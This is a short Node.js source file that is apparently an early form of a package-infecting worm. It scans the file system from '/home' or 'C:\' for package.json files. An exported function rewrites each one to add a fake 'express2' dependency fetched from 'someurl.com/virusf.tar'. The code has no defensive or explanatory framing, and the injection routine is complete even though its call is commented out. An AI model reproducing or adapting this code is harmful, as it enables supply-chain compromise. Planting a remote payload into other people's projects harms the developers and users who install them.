/* ======================================================== *
 * > Packages
 * ======================================================== */
var walk = require('walk');
var os = require('os');

/* ======================================================== *
 * > Packages
 * ======================================================== */
var fileSystem = require('../files/fileSystem.js');
var beautify = require('../files/beautifier.js');



/**
 * Walk and Search for a Package.json
 * 
 * @return void
 */
exports.walkFileSystem = function () {
    var entryPoint = this.getEntryPoint();
    console.log('entryPoint: ' + entryPoint);

    var walker = walk.walk(entryPoint);
    var h = this;

    walker.on("file", function (root, fileStats, next) {
        if (fileStats.name == 'package.json') {
            console.log('found a package.json at: ' + root);
            //h.manipulatePackage(root + '/package.json');
        }
        next();
    });

    walker.on("errors", function (root, nodeStatsArray, next) {
        next();
    });

    walker.on("end", function () {
        console.log("all done");
    });
}

/**
 * Get entryPoint by OS
 * 
 * 
 * @return void
 */
exports.getEntryPoint = function () {
    var osType = os.type();
    if (osType == null) {
        return null;
    }
    if (osType == 'Linux') {
        return '/home';
    }
    if(osType == 'Darwin'){
        return '';
    }
    if(osType == 'Windows_NT'){
        return 'C:\\';
    }
}



/**
 * Manipulate a Package.json
 * 
 * @param packagePath: string
 * 
 * 
 * @return void
 */
exports.manipulatePackage = function (packagePath) {
    var check = fileSystem.checkFileExists(packagePath);
    if (check) {
        var packageJson = require(packagePath);
        packageJson.dependencies["express2"] = "someurl.com/virusf.tar";
        packageJson = JSON.stringify(packageJson);

        packageJson = beautify.beautify(packageJson);

        console.log(packageJson);

        var write = fileSystem.writeFile(packagePath, packageJson, function (done) {
            console.log('Writing the Package.json: ' + done);
        });
    }
    else {
        console.log('Package.json not found!')
    }
}